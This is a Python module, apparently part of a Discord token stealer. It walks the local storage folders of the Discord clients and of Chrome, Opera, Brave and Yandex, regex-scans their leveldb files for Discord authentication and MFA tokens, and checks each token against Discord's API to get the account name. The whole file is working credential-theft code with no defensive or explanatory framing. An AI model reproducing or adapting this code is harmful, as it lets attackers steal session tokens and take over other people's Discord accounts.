import modules.util, os, re, requests, random, base64

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def get_username(token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    content = r.json()
    if "unauthorized" in r.text:
        return "401: unauthorized"
    return f"{content['username']}#{content['discriminator']}"

def get_tokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def detect_tokens() -> list[str]:
    checked = []
    for plat, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in get_tokens(path):
            if token in checked:
                continue
            checked.append(token)
    return checked